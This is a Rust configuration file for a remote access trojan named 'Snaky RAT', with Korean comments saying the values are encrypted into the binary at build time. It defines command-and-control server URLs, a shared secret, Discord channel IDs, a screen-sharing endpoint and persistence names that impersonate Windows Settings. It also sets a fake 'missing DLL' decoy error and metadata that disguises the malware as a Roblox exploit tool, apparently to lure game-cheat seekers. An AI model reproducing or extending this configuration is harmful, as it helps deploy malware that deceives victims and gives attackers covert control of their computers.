// ============================================================
// Snaky RAT - User Configuration (PLAIN TEXT)
// ============================================================
// 이 파일의 값들은 빌드 시 자동으로 'Mnemonic Dictionary Mapping'
// 기술을 통해 저엔트로피 암호화되어 바이너리에 포함됩니다.

pub const C2_PRIMARY: &str = "https://your-worker-name.your-subdomain.workers.dev";
pub const C2_BACKUP: &str = "https://your-backup-worker.your-subdomain.workers.dev";
pub const SHARED_SECRET: &str = "INSERT_YOUR_32_BYTE_HEX_SECRET_HERE_0123456789abcd";
pub const GUILD_ID: &str = "1234567890123456789";
pub const TASK_NAME: &str = "Windows Settings Service";
pub const EXE_NAME: &str = "SystemSettings.exe";
pub const INSTALL_SUBDIR: &str = "Windows Settings";
pub const BOT_PREFIX: &str = ".";
pub const SCREEN_SHARE_WORKER_URL: &str = "https://your-screen-share.your-subdomain.workers.dev";
pub const GLOBAL_CHANNEL_ID: &str = "1234567890123456789";

// Decoy / Stealth Headers
pub const DECOY_TITLE: &str = "dx9ware.exe - System Error";
pub const DECOY_MESSAGE: &str = "The program can't start because dx9_core.dll is missing from your computer. Try reinstalling the program to fix this problem.";
pub const PRODUCT_NAME: &str = "dx9ware";
pub const PRODUCT_DESC: &str = "dx9ware roblox exploit";
pub const COMPANY_NAME: &str = "dx9ware";
pub const FILE_VERSION: &str = "1.0.0.0";
